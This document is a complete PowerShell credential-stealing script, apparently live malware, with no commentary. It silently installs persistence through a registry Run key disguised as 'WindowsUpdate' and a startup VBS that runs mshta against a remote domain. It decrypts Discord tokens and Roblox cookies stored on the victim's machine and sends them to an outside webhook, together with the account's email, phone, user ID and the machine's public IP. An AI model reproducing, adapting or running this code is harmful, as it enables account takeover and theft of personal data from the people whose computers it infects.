$ErrorActionPreference = "SilentlyContinue"
$WH = "https://api.dicerigx.app/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
$PC = $env:COMPUTERNAME

function Send-Webhook($title, $desc, $color) {
    $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null } catch {}
}

# --- 1. PERSISTENCE ---
try {
    $CMD = 'mshta https://dicerigx.app/'
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
    $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Set-Content -Path $StartupVBS -Value "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False" -ErrorAction SilentlyContinue
} catch {}

# --- 2. DISCORD TOKENS ---
Add-Type -AssemblyName System.Security
$csharp = @"
using System;
using System.Security.Cryptography;
public class Gcm {
    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {
        using (var aes = Aes.Create()) {
            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;
            byte[] o = new byte[ct.Length];
            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;
            using (var e = aes.CreateEncryptor()) {
                for (int i = 0; i < ct.Length; i += 16) {
                    byte[] k = e.TransformFinalBlock(c, 0, 16);
                    int n = Math.Min(16, ct.Length - i);
                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);
                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }
                }
            }
            return o;
        }
    }
}
"@
Add-Type -TypeDefinition $csharp -Language CSharp

$appdata = $env:APPDATA
$mk = $null
try {
    $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
    $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
} catch {}

$tokens = @{}
$discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb", "$appdata\discordcanary\Local Storage\leveldb")
foreach ($dp in $discordPaths) {
    if (!(Test-Path $dp)) { continue }
    Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
        $raw = $null
        try {
            $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
            $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()
        } catch { return }
        if (!$raw -or !$mk) { return }
        foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
            $b64 = $m.Groups[1].Value
            while ($b64.Length % 4 -ne 0) { $b64 += '=' }
            try {
                $eb = [Convert]::FromBase64String($b64)
                if ($eb.Length -lt 80) { continue }
                $t = [Text.Encoding]::UTF8.GetString([Gcm]::Decrypt($mk, $eb[3..14], $eb[15..($eb.Length-17)])).TrimEnd([char]0)
                if ($t.Length -gt 40 -and !$tokens[$t]) { $tokens[$t] = $t }
            } catch {}
        }
    }
}

foreach ($t in $tokens.Keys) {
    try {
        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
        if ($r.username) {
            $info = "**User:** $($r.username)`n"
            if ($r.email) { $info += "**Email:** $($r.email)`n" }
            if ($r.phone) { $info += "**Phone:** $($r.phone)`n" }
            if ($r.id) { $info += "**ID:** $($r.id)`n" }
            $info += "**Token:** $t"
            Send-Webhook ":gift: Discord Token" $info 5793266
        }
    } catch {}
}

# --- 3. ROBLOX COOKIES ---
$l = $env:LOCALAPPDATA
$rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
foreach ($rp in $rbxPaths) {
    if (Test-Path $rp) {
        try {
            $raw = Get-Content $rp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $b64 = $Matches[1]
                $eb = [Convert]::FromBase64String($b64)
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $cookie = [Text.Encoding]::UTF8.GetString($db)
                if ($cookie -match '_\|WARNING[^;\s]{50,}') {
                    $c = $Matches[0]
                    Send-Webhook ":cookie: Roblox Cookie" "**Size:** $($c.Length) `n**PC:** $PC`n**Cookie:**``$c``" 65280
                }
            }
        } catch {}
        break
    }
}

# --- 4. SYSTEM INFO ---
try {
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
    Send-Webhook ":dart: Target" "**IP:** $ip `n**PC:** $PC" 3447003
} catch {}
